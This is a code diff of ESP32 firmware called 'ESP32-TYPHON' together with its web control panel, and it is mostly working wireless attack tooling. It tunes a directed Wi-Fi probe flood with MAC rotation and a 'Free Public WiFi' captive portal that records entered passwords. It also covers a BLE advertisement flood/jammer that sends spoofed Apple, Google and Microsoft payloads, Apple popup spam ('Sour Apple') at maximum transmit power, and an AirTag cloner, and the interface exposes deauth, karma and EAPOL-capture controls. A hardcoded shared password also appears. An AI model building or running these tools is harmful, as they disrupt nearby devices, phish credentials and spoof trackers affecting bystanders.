     WiFi.softAP("ESP32-TYPHON", "rgisking", 1, 0, 4);
+    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
   } else {
     WiFi.mode(WIFI_AP);
     WiFi.softAP("esp32div", nullptr, probeCh, 1, 0);
+    esp_wifi_set_channel(probeCh, WIFI_SECOND_CHAN_NONE);
   }
-  delay(30);
-  esp_wifi_set_channel(webMode ? 1 : probeCh, WIFI_SECOND_CHAN_NONE);
+  radioSettleRequest(15);
 }
 
 static void probeStop() {
   probeRunning = false;
-  if (webMode) {
-    restoreWebAP();
-  } else {
+  radioRelease(RADIO_WIFI_TX);
+  if (webMode && !warMode) restoreWebAP();
+  else if (!webMode) {
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_STA);
   }
@@ -1310,25 +1503,24 @@ static void probeStop() {
 static void probeUpdate() {
   if (!probeRunning) return;
   if (probeTarget < 0 || probeTarget >= wifiCount) { probeStop(); return; }
-  if (millis() - probeLast < 5) return;  // aggressive stress cadence
+  if (millis() - probeLast < 4) return;
   probeLast = millis();
 
   const char* ssid = wifiNets[probeTarget].ssid.c_str();
   if (wifiNets[probeTarget].hidden || wifiNets[probeTarget].ssid == "<hidden>") ssid = "";
   const uint8_t* bssid = wifiNets[probeTarget].bssid;
-  probeCh = wifiNets[probeTarget].ch;
-  if (probeCh < 1 || probeCh > 13) probeCh = 1;
+  probeCh = wifiTxChannel(wifiNets[probeTarget].ch);
 
-  // Occasional MAC rotation so AP sees many "clients" probing
-  if ((probeSent % 40) == 0) probeRandomMac();
+  // Sticky MAC for 80 frames then rotate
+  if ((probeSent % 80) == 0) probeRandomMac();
 
   int len = probeBuildDirected(ssid, bssid, probeCh);
   esp_wifi_set_channel(probeCh, WIFI_SECOND_CHAN_NONE);
-  for (int i = 0; i < 6; i++) {
+  for (int i = 0; i < 10; i++) {
     esp_wifi_80211_tx(WIFI_IF_AP, probePacket, len, false);
     probeSent++;
   }
-  if (webMode) esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+  if (webSafeActive()) wifiStayOnApChannel();
 }
 
 // ============================================================
@@ -1386,7 +1578,7 @@ static void captiveStart() {
   captiveLastPass[0] = 0;
   WiFi.mode(WIFI_AP);
   WiFi.softAP("Free Public WiFi", "");
-  delay(100);
+  radioSettleRequest(40);
   dnsServer.start(53, "*", WiFi.softAPIP());
   webServer.onNotFound(handleCaptiveRoot);
   webServer.on("/", handleCaptiveRoot);
@@ -1435,7 +1627,7 @@ static void restoreWebAP() {
   // Keep Soft-AP alive for the browser session
   WiFi.mode(WIFI_AP);
   WiFi.softAP("ESP32-TYPHON", "rgisking");
-  delay(80);
+  radioSettleRequest(25);
 }
 
 static void stopAllTools() {
@@ -1482,6 +1674,8 @@ struct BleDev {
   uint8_t macChanges;
   uint8_t mfg[31];
   uint8_t mfgLen;
+  uint8_t adv[62];
+  uint8_t advLen;
 };
 
 static BleDev   bleDevs[BLE_MAX_DEVS];
@@ -1523,7 +1717,7 @@ static void bleShutdownAll() {
   esp_bt_controller_disable();
   esp_bt_controller_deinit();
   bleReady = false;
-  delay(50);
+  radioSettleRequest(20);
 }
 
 static void bleGapCb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param);
@@ -1576,11 +1770,16 @@ static void bleProcessAdv(uint8_t *bda, int rssi, uint8_t *payload, uint8_t plen
     bleDevs[idx].suspicious = false;
     bleDevs[idx].randomized = bleIsRandomizedMac(addr);
     bleDevs[idx].mfgLen = 0;
+    bleDevs[idx].advLen = 0;
     bleNewThisScan++;
   }
   bleDevs[idx].rssi = rssi;
   bleDevs[idx].hits++;
   bleDevs[idx].lastSeen = now;
+  if (plen > 0 && plen < 62) {
+    memcpy(bleDevs[idx].adv, payload, plen);
+    bleDevs[idx].advLen = plen;
+  }
 
   // Parse AD structures for name + mfg
   uint8_t i = 0;
@@ -1640,8 +1839,15 @@ static esp_ble_scan_params_t bleScanParams = {
   .scan_duplicate = BLE_SCAN_DUPLICATE_DISABLE
 };
 
+static void airSpoofStop();
 static void bleScanStart() {
   if (bleScanning) return;
+  // Wave 1 A7: pause ADV tools for clean scan
+  if (sourRunning) sourStop();
+  if (jamRunning) jamStop();
+  if (spoofRunning) spoofStop();
+  if (airSpoofRunning) airSpoofStop();
+  radioAcquire(RADIO_BLE_SCAN);
   bleInit();
   if (!bleReady) return;
   bleNewThisScan = 0;
@@ -1661,6 +1867,7 @@ static void bleScanUpdate() {
   }
   if (!bleScanDone) return;
   bleScanDone = false;
+  radioRelease(RADIO_BLE_SCAN);
 
   bleSuspicious = 0;
   for (int i = 0; i < bleCount; i++)
@@ -1712,7 +1919,7 @@ static void sniffUpdate() {
 // ============================================================
 //  BLE Spoofer – Bluedroid raw / name ADV
 // ============================================================
-static bool spoofRunning = false;
+
 static uint8_t spoofIdx = 0;
 static int spoofNameIdx = 0;
 static uint32_t spoofLast = 0;
@@ -1833,13 +2040,15 @@ static void spoofUpdate() {
 // fix: remove bogus spoofSentOrRotate - I'll fix after
 
 // ============================================================
-//  BLE Jammer – raw ADV noise flood (ESP32 radio only)
+//  BLE ADV Flood – raw ADV noise flood (ESP32 radio only)
 // ============================================================
-static bool jamRunning = false;
+
 static uint32_t jamLast = 0;
 static uint32_t jamCount = 0;
 
 static void jamStart() {
+  sniffStop();
+  radioAcquire(RADIO_BLE_ADV);
   bleInit();
   if (bleScanning) { esp_ble_gap_stop_scanning(); bleScanning = false; }
   jamRunning = true;
@@ -1851,18 +2060,19 @@ static void jamStop() {
   if (!jamRunning) return;
   jamRunning = false;
   esp_ble_gap_stop_advertising();
+  radioRelease(RADIO_BLE_ADV);
 }
 
 static void jamUpdate() {
   if (!jamRunning) return;
-  if (millis() - jamLast < 12) return;
+  if (millis() - jamLast < 8) return;
   jamLast = millis();
   jamCount++;
-  bleInit();
+  if (!bleReady) { bleInit(); if (!bleReady) return; }
 
   uint8_t raw[31];
   int plen = 16;
-  uint8_t kind = (uint8_t)(jamCount % 4);
+  uint8_t kind = (uint8_t)(jamCount % 6);
   if (kind == 0) {
     raw[0] = 0x1E; raw[1] = 0xFF; raw[2] = 0x4C; raw[3] = 0x00;
     for (int i = 4; i < 31; i++) raw[i] = (uint8_t)esp_random();
@@ -1875,21 +2085,30 @@ static void jamUpdate() {
     memcpy(raw, GOOGLE_ADV_TEMPLATE, 14);
     for (int i = 8; i < 14; i++) raw[i] = (uint8_t)esp_random();
     plen = 14;
+  } else if (kind == 3) {
+    raw[0] = 0x1E; raw[1] = 0xFF; raw[2] = 0x06; raw[3] = 0x00;
+    for (int i = 4; i < 31; i++) raw[i] = (uint8_t)esp_random();
+    plen = 31;
+  } else if (kind == 4) {
+    raw[0] = 0x02; raw[1] = 0x01; raw[2] = 0x06;
+    raw[3] = 0x03; raw[4] = 0x03; raw[5] = 0x2C; raw[6] = 0xFE;
+    for (int i = 7; i < 20; i++) raw[i] = (uint8_t)esp_random();
+    plen = 20;
   } else {
     raw[0] = 0x1A; raw[1] = 0xFF;
     for (int i = 2; i < 27; i++) raw[i] = (uint8_t)esp_random();
     plen = 27;
   }
 
-  if ((jamCount % 10) == 1) {
+  {
     esp_bd_addr_t mac;
-    mac[0] = (uint8_t)((esp_random() & 0xFF) | 0xC0);
+    mac[0] = (uint8_t)((esp_random() & 0x3F) | 0xC0);
     for (int i = 1; i < 6; i++) mac[i] = (uint8_t)esp_random();
     esp_ble_gap_set_rand_addr(mac);
   }
 
   bleAdvParams.adv_int_min = 0x10;
-  bleAdvParams.adv_int_max = 0x18;
+  bleAdvParams.adv_int_max = 0x14;
   esp_ble_gap_config_adv_data_raw(raw, plen);
   esp_ble_gap_start_advertising(&bleAdvParams);
 }
@@ -1934,7 +2153,7 @@ static const AppleType appleList[] = {
 };
 static const int APPLE_LIST_COUNT = sizeof(appleList) / sizeof(appleList[0]);
 
-static bool    sourRunning = false;
+
 static int     sourSelected = 0;
 static uint32_t sourLast = 0;
 static uint32_t sourSent = 0;
@@ -1983,15 +2202,22 @@ static void sourStop() {
   if (!sourRunning) return;
   sourRunning = false;
   esp_ble_gap_stop_advertising();
+  radioRelease(RADIO_BLE_ADV);
 }
+
+static uint16_t sourIntervalMs = 12;
 
 static void sourBeginAdvertise() {
   sniffStop();
   spoofStop();
   jamStop();
   airTagStop();
+  radioAcquire(RADIO_BLE_ADV);
   bleInit();
-  if (!bleReady) { sourRunning = false; return; }
+  if (!bleReady) { sourRunning = false; radioRelease(RADIO_BLE_ADV); return; }
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
   sourRunning = true;
   sourLast = 0;
   sourSent = 0;
@@ -1999,11 +2225,10 @@ static void sourBeginAdvertise() {
 
 static void sourUpdate() {
   if (!sourRunning) return;
-  if (millis() - sourLast < 12) return;
+  if (millis() - sourLast < sourIntervalMs) return;
   sourLast = millis();
   sourSent++;
-  bleInit();
-  if (!bleReady) return;
+  if (!bleReady) { bleInit(); if (!bleReady) return; }
 
   int idx = sourSelected;
   if (idx < 0 || idx >= APPLE_LIST_COUNT)
@@ -2043,10 +2268,10 @@ struct AirTagDev {
 
 static AirTagDev airTags[AIRTAG_MAX];
 static int       airTagCount = 0;
-static bool      airDetRunning = false;
+
 static uint32_t  airDetLast = 0;
 static bool      airDetScanning = false;
-static bool      airSpoofRunning = false;
+
 static int       airSpoofTarget = -1;
 static int       airSpoofIdx = 0;
 static uint32_t  airSpoofLast = 0;
@@ -2090,8 +2315,13 @@ static void airDetHarvestFromBleList() {
     bool match = false;
     uint8_t buf[62];
     uint8_t blen = 0;
-    if (bleDevs[i].mfgLen >= 4) {
-      // Rebuild AD: len, 0xFF, mfg bytes
+    // Wave 1: prefer full ADV blob (nyanBOX-style)
+    if (bleDevs[i].advLen >= 4) {
+      blen = bleDevs[i].advLen;
+      memcpy(buf, bleDevs[i].adv, blen);
+      if (isAirTagPayload(buf, blen)) match = true;
+    }
+    if (!match && bleDevs[i].mfgLen >= 4) {
       buf[0] = (uint8_t)(bleDevs[i].mfgLen + 1);
       buf[1] = 0xFF;
       memcpy(buf + 2, bleDevs[i].mfg, bleDevs[i].mfgLen);
@@ -2199,6 +2429,7 @@ static void airSpoofStop() {
   airTagRunning = false;
   airTagMode = 0;
   esp_ble_gap_stop_advertising();
+  radioRelease(RADIO_BLE_ADV);
 }
 
 static void airSpoofStart(int targetIdx) {
@@ -2206,9 +2437,11 @@ static void airSpoofStart(int targetIdx) {
   if (targetIdx >= airTagCount) targetIdx = 0;
   airDetStop();
   sniffStop(); spoofStop(); sourStop(); jamStop();
+  radioAcquire(RADIO_BLE_ADV);
   bleInit();
-  if (!bleReady) return;
-  airSpoofTarget = targetIdx;
+  if (!bleReady) { radioRelease(RADIO_BLE_ADV); return; }
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+  airSpoofTarget = targetIdx;  // -1 = clone all rotator
   airSpoofIdx = (targetIdx >= 0) ? targetIdx : 0;
   airSpoofRunning = true;
   airTagRunning = true;
@@ -2245,14 +2478,16 @@ static void airSpoofUpdate() {
 
   uint8_t mac[6];
   if (parseMacStr(d.addr, mac)) {
-    mac[0] = (uint8_t)(mac[0] | 0xC0);
+    // BLE random static: keep top bits 11 as required by stack
+    mac[0] = (uint8_t)((mac[0] & 0x3F) | 0xC0);
     esp_ble_gap_set_rand_addr(mac);
-  } else if ((airTagSent % 10) == 1) {
-    mac[0] = (uint8_t)((esp_random() & 0xFF) | 0xC0);
+  } else if ((airTagSent % 5) == 1) {
+    mac[0] = (uint8_t)((esp_random() & 0x3F) | 0xC0);
     for (int i = 1; i < 6; i++) mac[i] = (uint8_t)esp_random();
     esp_ble_gap_set_rand_addr(mac);
   }
 
+  if (d.payloadLen < 4) return; // Wave 2: do not spam empty synthetic unless seeded
   esp_ble_gap_config_adv_data_raw(d.payload, d.payloadLen);
   esp_ble_gap_start_advertising(&airAdvParams);
 }
@@ -2373,6 +2608,8 @@ label.lbl{font-size:.75rem;color:var(--dim);display:block;margin:8px 0 4px}
   <div class="stats">Temp <b id="temp">—</b> °C</div>
 </div>
 <div class="wrap">
+<div class="card" style="border-color:#3a3;margin:0.5rem 0"><div class="msg"><b>Web-safe mode</b> — Soft-AP stays on CH1. Wi‑Fi attacks only affect CH1. Off-channel deauth/probe/sniff/EAPOL need <b>handheld</b>. BLE tools OK.</div></div>
+
 
 <div id="v-home" class="view active">
   <div class="grid">
@@ -2409,7 +2646,7 @@ label.lbl{font-size:.75rem;color:var(--dim);display:block;margin:8px 0 4px}
     <div class="tile" onclick="go('ble-sniff')"><div class="ico">👁</div><h2>BLE Sniffer</h2><p>Continuous scan</p></div>
     <div class="tile" onclick="go('ble-spoof')"><div class="ico">🎭</div><h2>BLE Spoofer</h2><p>Fake names</p></div>
     <div class="tile" onclick="go('ble-sour')"><div class="ico">🍎</div><h2>Sour Apple</h2><p>Pick model / action</p></div>
-    <div class="tile" onclick="go('ble-jam')"><div class="ico">📻</div><h2>BLE Jammer</h2><p>Noise flood</p></div>
+    <div class="tile" onclick="go('ble-jam')"><div class="ico">📻</div><h2>BLE ADV Flood</h2><p>Noise flood</p></div>
     <div class="tile" onclick="go('ble-airdet')"><div class="ico">📍</div><h2>AirTag Detector</h2><p>Find nearby AirTags</p></div>
     <div class="tile" onclick="go('ble-air')"><div class="ico">🏷</div><h2>AirTag Spoofer</h2><p>Clone / spam payloads</p></div>
   </div>
@@ -2599,7 +2836,7 @@ label.lbl{font-size:.75rem;color:var(--dim);display:block;margin:8px 0 4px}
 </div>
 
 <div id="v-ble-jam" class="view">
-  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">BLE Jammer</h2></div>
+  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">BLE ADV Flood</h2></div>
   <div class="card">
     <h3>Noise</h3>
     <div class="row"><button id="btnJam" class="attack" onclick="toggle('jam')">Start</button></div>
@@ -2729,6 +2966,7 @@ function apply(s){
   S=s||{};
   setMode(s.mode||'idle');
   document.getElementById('temp').textContent=(s.temp!=null)?Number(s.temp).toFixed(1):'—';
+  const wr=document.getElementById('warRadio'); if(wr) wr.textContent=(s.war?'WAR ':'')+(s.radio||'');
   setToggle('btnPm',s.pm); setToggle('btnBeacon',s.beacon); setToggle('btnDeauth',s.deauth);
   setToggle('btnClientSniff',s.clientSniff);
   setToggle('btnKarma',s.karma); setToggle('btnFlood',s.flood); setToggle('btnEapol',s.eapol);
@@ -2737,10 +2975,10 @@ function apply(s){
   const fs=document.getElementById('floodSent'); if(fs) fs.textContent=s.floodSent||0;
   const ec=document.getElementById('eapolCount'); if(ec) ec.textContent=s.eapolCount||0;
   const ho=document.getElementById('heapOut'); if(ho) ho.textContent=s.heap||0;
-  renderFloodList(s.wifi);
+  if(s.wifi) renderFloodList(s.wifi);
   const dcc=document.getElementById('deauthClientCount'); if(dcc) dcc.textContent=s.clientCount||0;
   const cc=document.getElementById('clientCount'); if(cc) cc.textContent=s.clientCount||0;
-  renderClientApList(s.wifi); renderClientMacs(s.clients);
+  if(s.wifi) renderClientApList(s.wifi); if(s.clients) renderClientMacs(s.clients);
   setToggle('btnDet',s.det); setToggle('btnProbe',s.probe); setToggle('btnSpoof',s.spoof);
   setToggle('btnSour',s.sour); setToggle('btnJam',s.jam); setToggle('btnAir',s.air); setToggle('btnSniff',s.sniff);
   document.getElementById('wscanBar').style.width=s.wifiScanning?'75%':'0%';
@@ -2765,8 +3003,7 @@ function apply(s){
   const ac2=document.getElementById('airCount2'); if(ac2) ac2.textContent=ac;
   setToggle('btnAirDet', s.airDet);
   setToggle('btnAir', s.air);
-  renderAir(s.airtags);
-  fillAirTargets(s.airtags);
+  if(s.airtags){renderAir(s.airtags);fillAirTargets(s.airtags);}
   if(airSelected>=0 && s.airtags && s.airtags[airSelected]){
     const t=(s.airtags[airSelected].name||'AirTag')+' · '+(s.airtags[airSelected].addr||'');
     setTargetBar('airDetTargetBar','airSelectedLabel', t, false);
@@ -2775,7 +3012,9 @@ function apply(s){
   document.getElementById('sourSent').textContent=s.sourSent||0;
   document.getElementById('sourName').textContent=s.sourName||'—';
   document.getElementById('wscanMsg').textContent=s.wifiScanning?'Scanning… keeping previous list until done':((s.wifi&&s.wifi.length)?(s.wifi.length+' networks'):'No networks yet');
-  renderWifi(s.wifi); renderProbe(s.wifi); renderBle(s.ble); fillApple(s.apple);
+  if(s.wifi){S.wifi=s.wifi;renderWifi(s.wifi);renderProbe(s.wifi);}
+  if(s.ble){S.ble=s.ble;renderBle(s.ble);}
+  if(s.apple) fillApple(s.apple);
   if(probeTarget>=0 && s.wifi && s.wifi[probeTarget]){
     const n=s.wifi[probeTarget];
     setTargetBar('probeTargetBar','probeTargetLabel', n.ssid+' · CH'+n.ch+' · '+(n.bssid||''), false);
@@ -2787,7 +3026,13 @@ function apply(s){
   if(s.sourName) setTargetBar('sourTargetBar','sourTargetLabel', s.sourName, false);
 }
 const API_KEY='rgisking';
-async function refresh(){try{const r=await fetch('/api/status?key='+encodeURIComponent(API_KEY),{headers:{'X-TYPHON-KEY':API_KEY}});if(!r.ok)throw new Error('auth');apply(await r.json());}catch(e){}}
+async function apiGet(path){const r=await fetch(path+(path.indexOf('?')>=0?'&':'?')+'key='+encodeURIComponent(API_KEY),{headers:{'X-TYPHON-KEY':API_KEY}});if(!r.ok)throw new Error('auth');return r.json();}
+async function refresh(){try{apply(await apiGet('/api/status'));}catch(e){}}
+async function loadWifi(){try{const j=await apiGet('/api/wifi');S.wifi=j.wifi||[];if(typeof renderWifi==='function')renderWifi(S.wifi);if(typeof renderDeauthList==='function')renderDeauthList(S.wifi);if(typeof renderProbeList==='function')renderProbeList(S.wifi);if(typeof renderClientApList==='function')renderClientApList(S.wifi);if(typeof renderFloodList==='function')renderFloodList(S.wifi);}catch(e){}}
+async function loadBle(){try{const j=await apiGet('/api/ble');S.ble=j.ble||[];if(j.apple)S.apple=j.apple;if(typeof renderBle==='function')renderBle(S.ble);if(typeof fillSourSelect==='function')fillSourSelect(S.apple);}catch(e){}}
+async function loadClients(){try{const j=await apiGet('/api/clients');S.clients=j.clients||[];if(typeof renderClientMacs==='function')renderClientMacs(S.clients);}catch(e){}}
+async function loadAir(){try{const j=await apiGet('/api/air');S.airtags=j.airtags||[];if(typeof renderAir==='function')renderAir(S.airtags);if(typeof fillAirTargets==='function')fillAirTargets(S.airtags);}catch(e){}}
+async function refreshLists(){const v=document.querySelector('.view.active');const id=v?v.id:'';if(id==='v-wifi-scan'||id==='v-wifi-deauth'||id==='v-wifi-probe'||id==='v-wifi-clients'||id==='v-wifi-flood'||id==='v-wifi')await loadWifi();if(id==='v-ble-scan'||id==='v-ble-sniff'||id==='v-ble-sour'||id==='v-ble')await loadBle();if(id==='v-wifi-clients')await loadClients();if(id==='v-ble-air')await loadAir();}
 async function act(action,extra){
   const body=Object.assign({action},extra||{});
   if(action==='pm_start'){body.ch=parseInt(document.getElementById('pmCh').value)||1;body.hop=document.getElementById('pmHop').checked?1:0;}
@@ -2809,7 +3054,8 @@ async function act(action,extra){
     const r=await fetch('/api',{method:'POST',headers:{'Content-Type':'application/json','X-TYPHON-KEY':API_KEY},body:JSON.stringify(Object.assign({key:API_KEY},body))});
     const j=await r.json();
     document.getElementById('sysMsg').textContent=j.msg||'';
-    if(j.status) apply(j.status);
+    await refresh();
+    if(typeof refreshLists==='function') await refreshLists();
   }catch(e){document.getElementById('sysMsg').textContent='Request failed — reconnect to ESP32-TYPHON';}
 }
 function toggle(tool){
@@ -2939,7 +3185,8 @@ el.innerHTML=list.map((n,i)=>`<div class="item${floodTarget===i?' active':''}" o
 function toggleFlood(){if(S.flood)act('flood_stop');else{if(floodTarget<0){document.getElementById('sysMsg').textContent='Pick AP';return;}act('flood_start',{target:floodTarget,mode:parseInt(document.getElementById('floodMode').value)||0});}}
 function toggleEapol(){if(S.eapol)act('eapol_stop');else act('eapol_start',{ch:parseInt(document.getElementById('eapolCh').value)||1});}
 
-setInterval(refresh,1200); refresh();
+setInterval(async()=>{await refresh();if(typeof refreshLists==='function')await refreshLists();},500);
+refresh().then(()=>{if(typeof refreshLists==='function')refreshLists();});
 </script>
 </body></html>
 )HTML";
@@ -2950,88 +3197,97 @@ static float readChipTempC() {
   return temperatureRead();
 }
 
+static const char* radioOwnerName() {
+  switch (radioOwner) {
+    case RADIO_WIFI_SCAN: return "wifi_scan";
+    case RADIO_WIFI_TX:   return "wifi_tx";
+    case RADIO_BLE_SCAN:  return "ble_scan";
+    case RADIO_BLE_ADV:   return "ble_adv";
+    default:              return "none";
+  }
+}
+
+// Wave 3: slim status — counters/flags only (no device lists)
 static String jsonStatus() {
-  String j = "{";
-  bool any = pmRunning || beaconRunning || deauthRunning || detRunning ||
-             probeRunning || sniffRunning || spoofRunning || sourRunning ||
-             jamRunning || airTagRunning;
+  char buf[1536];
   const char* mode = "idle";
   if (wifiScanning || bleScanning || sniffRunning || pmRunning || airDetRunning || clientSniffRunning) mode = "scanning";
   else if (detRunning) mode = "defending";
   else if (beaconRunning || deauthRunning || probeRunning || spoofRunning ||
            sourRunning || jamRunning || airSpoofRunning || karmaRunning || floodRunning) mode = "attacking";
-  j += "\"mode\":\""; j += mode; j += "\",";
-  j += "\"any\":"; j += any ? "true," : "false,";
-  j += "\"pm\":"; j += pmRunning ? "true," : "false,";
-  j += "\"beacon\":"; j += beaconRunning ? "true," : "false,";
-  j += "\"deauth\":"; j += deauthRunning ? "true," : "false,";
-  j += "\"war\":"; j += warMode ? "true," : "false,";
-  j += "\"karma\":"; j += karmaRunning ? "true," : "false,";
-  j += "\"flood\":"; j += floodRunning ? "true," : "false,";
-  j += "\"eapol\":"; j += eapolRunning ? "true," : "false,";
-  j += "\"karmaSent\":" + String((unsigned long)karmaSent) + ",";
-  j += "\"karmaCount\":" + String(karmaCount) + ",";
-  j += "\"floodSent\":" + String((unsigned long)floodSent) + ",";
-  j += "\"eapolCount\":" + String((int)eapolCount) + ",";
-  j += "\"heap\":" + String((unsigned long)ESP.getFreeHeap()) + ",";
-  j += "\"clientSniff\":"; j += clientSniffRunning ? "true," : "false,";
-  {
-    int eff = 0;
-    // Only count clients when sniff AP matches current deauth target (or sniff active)
-    if (clientSniffAp >= 0) eff = clientCount;
-    j += "\"clientCount\":" + String(eff) + ",";
-    j += "\"clientSniffAp\":" + String(clientSniffAp) + ",";
+  bool any = pmRunning || beaconRunning || deauthRunning || detRunning ||
+             probeRunning || sniffRunning || spoofRunning || sourRunning ||
+             jamRunning || airTagRunning || karmaRunning || floodRunning || eapolRunning;
+
+  const char* sn = "-";
+  if (sourRunning) {
+    if (sourSelected < 0) sn = "Random Mix";
+    else if (sourSelected < APPLE_LIST_COUNT) sn = appleList[sourSelected].name;
   }
-  j += "\"det\":"; j += detRunning ? "true," : "false,";
-  j += "\"probe\":"; j += probeRunning ? "true," : "false,";
-  j += "\"spoof\":"; j += spoofRunning ? "true," : "false,";
-  j += "\"sour\":"; j += sourRunning ? "true," : "false,";
-  j += "\"jam\":"; j += jamRunning ? "true," : "false,";
-  j += "\"air\":"; j += airSpoofRunning ? "true," : "false,";
-  j += "\"airDet\":"; j += airDetRunning ? "true," : "false,";
-  j += "\"airCount\":" + String(airTagCount) + ",";
-  j += "\"sniff\":"; j += sniffRunning ? "true," : "false,";
-  j += "\"wifiScanning\":"; j += wifiScanning ? "true," : "false,";
-  j += "\"bleScanning\":"; j += bleScanning ? "true," : "false,";
-  j += "\"pmTotal\":" + String((unsigned long)pktTotal) + ",";
-  j += "\"pmCh\":" + String(pmChannel) + ",";
-  j += "\"pmHop\":"; j += pmHop ? "true," : "false,";
-  j += "\"pmMgmt\":" + String((unsigned long)pmMgmt) + ",";
-  j += "\"pmData\":" + String((unsigned long)pmData) + ",";
-  j += "\"pmCtrl\":" + String((unsigned long)pmCtrl) + ",";
-  j += "\"pmDeauth\":" + String((unsigned long)pmDeauthSeen) + ",";
-  j += "\"pmRssi\":" + String((int)pmLastRssi) + ",";
-  j += "\"bleSus\":" + String((unsigned long)bleSuspicious) + ",";
-  j += "\"bleFlood\":" + String((unsigned long)bleFloodAlerts) + ",";
-  j += "\"spoofPower\":" + String(spoofPower) + ",";
-  j += "\"spoofInterval\":" + String(spoofInterval) + ",";
-  j += "\"beaconSent\":" + String((unsigned long)beaconSent) + ",";
-  j += "\"deauthSent\":" + String((unsigned long)deauthSent) + ",";
-  j += "\"detCount\":" + String((unsigned long)deauthCount) + ",";
-  j += "\"probeSent\":" + String((unsigned long)probeSent) + ",";
-  j += "\"jamCount\":" + String((unsigned long)jamCount) + ",";
-  j += "\"airSent\":" + String((unsigned long)airTagSent) + ",";
-  j += "\"sourSent\":" + String((unsigned long)sourSent) + ",";
-  j += "\"temp\":" + String(readChipTempC(), 1) + ",";
-  j += "\"uptime\":" + String((unsigned long)millis()) + ",";
-  j += "\"clients\":" + String((unsigned)WiFi.softAPgetStationNum()) + ",";
-  j += "\"heap\":" + String((unsigned long)ESP.getFreeHeap()) + ",";
-  {
-    String sn = "—";
-    if (sourRunning) {
-      if (sourSelected < 0) sn = "Random Mix";
-      else if (sourSelected < APPLE_LIST_COUNT) sn = appleList[sourSelected].name;
-    }
-    sn.replace("\"", "'");
-    j += "\"sourName\":\"" + sn + "\",";
-  }
-  j += "\"apple\":[";
-  for (int i = 0; i < APPLE_LIST_COUNT; i++) {
-    if (i) j += ",";
-    String n = appleList[i].name; n.replace("\"", "'");
-    j += "\"" + n + "\"";
-  }
-  j += "],\"wifi\":[";
+
+  snprintf(buf, sizeof(buf),
+    "{"
+    "\"mode\":\"%s\",\"any\":%s,\"war\":%s,\"webSafe\":%s,\"radio\":\"%s\","
+    "\"pm\":%s,\"beacon\":%s,\"deauth\":%s,\"karma\":%s,\"flood\":%s,\"eapol\":%s,"
+    "\"clientSniff\":%s,\"det\":%s,\"probe\":%s,\"spoof\":%s,\"sour\":%s,\"jam\":%s,"
+    "\"air\":%s,\"airDet\":%s,\"sniff\":%s,"
+    "\"wifiScanning\":%s,\"bleScanning\":%s,"
+    "\"clientCount\":%d,\"clientSniffAp\":%d,\"airCount\":%d,"
+    "\"pmTotal\":%lu,\"pmCh\":%u,\"pmHop\":%s,"
+    "\"pmMgmt\":%lu,\"pmData\":%lu,\"pmCtrl\":%lu,\"pmDeauth\":%lu,\"pmRssi\":%d,"
+    "\"bleSus\":%lu,\"bleFlood\":%lu,"
+    "\"beaconSent\":%lu,\"deauthSent\":%lu,\"detCount\":%lu,\"probeSent\":%lu,"
+    "\"jamCount\":%lu,\"airSent\":%lu,\"sourSent\":%lu,"
+    "\"karmaSent\":%lu,\"karmaCount\":%d,\"floodSent\":%lu,\"eapolCount\":%d,"
+    "\"spoofPower\":%d,\"spoofInterval\":%d,"
+    "\"temp\":%.1f,\"heap\":%u,\"heapMin\":%u,\"clients\":%u,"
+    "\"sourName\":\"%s\""
+    "}",
+    mode,
+    any ? "true" : "false",
+    warMode ? "true" : "false",
+    webSafeActive() ? "true" : "false",
+    radioOwnerName(),
+    pmRunning ? "true" : "false",
+    beaconRunning ? "true" : "false",
+    deauthRunning ? "true" : "false",
+    karmaRunning ? "true" : "false",
+    floodRunning ? "true" : "false",
+    eapolRunning ? "true" : "false",
+    clientSniffRunning ? "true" : "false",
+    detRunning ? "true" : "false",
+    probeRunning ? "true" : "false",
+    spoofRunning ? "true" : "false",
+    sourRunning ? "true" : "false",
+    jamRunning ? "true" : "false",
+    airSpoofRunning ? "true" : "false",
+    airDetRunning ? "true" : "false",
+    sniffRunning ? "true" : "false",
+    wifiScanning ? "true" : "false",
+    bleScanning ? "true" : "false",
+    clientCount,
+    clientSniffAp,
+    airTagCount,
+    (unsigned long)pktTotal, (unsigned)pmChannel, pmHop ? "true" : "false",
+    (unsigned long)pmMgmt, (unsigned long)pmData, (unsigned long)pmCtrl,
+    (unsigned long)pmDeauthSeen, (int)pmLastRssi,
+    (unsigned long)bleSuspicious, (unsigned long)bleFloodAlerts,
+    (unsigned long)beaconSent, (unsigned long)deauthSent,
+    (unsigned long)deauthCount, (unsigned long)probeSent,
+    (unsigned long)jamCount, (unsigned long)airTagSent, (unsigned long)sourSent,
+    (unsigned long)karmaSent, karmaCount, (unsigned long)floodSent, (int)eapolCount,
+    spoofPower, spoofInterval,
+    (double)readChipTempC(),
+    (unsigned)ESP.getFreeHeap(),
+    (unsigned)ESP.getMinFreeHeap(),
+    (unsigned)WiFi.softAPgetStationNum(),
+    sn
+  );
+  return String(buf);
+}
+
+static String jsonWifiList() {
+  String j = "{\"wifi\":[";
   for (int i = 0; i < wifiCount; i++) {
     if (i) j += ",";
     String s = wifiNets[i].ssid; s.replace("\"", "'");
@@ -3046,17 +3302,23 @@ static String jsonStatus() {
       case WIFI_AUTH_WPA_PSK: encStr = "WPA"; break;
       case WIFI_AUTH_WPA2_PSK: encStr = "WPA2"; break;
       case WIFI_AUTH_WPA_WPA2_PSK: encStr = "WPA/WPA2"; break;
-      case WIFI_AUTH_WPA2_ENTERPRISE: encStr = "WPA2-E"; break;
+      case WIFI_AUTH_WPA2_ENTERPRISE: encStr = "Enterprise"; break;
       case WIFI_AUTH_WPA3_PSK: encStr = "WPA3"; break;
       case WIFI_AUTH_WPA2_WPA3_PSK: encStr = "WPA2/WPA3"; break;
-      default: encStr = "Secured"; break;
+      default: encStr = "Other"; break;
     }
-    j += "{\"ssid\":\"" + s + "\",\"rssi\":" + String(wifiNets[i].rssi) +
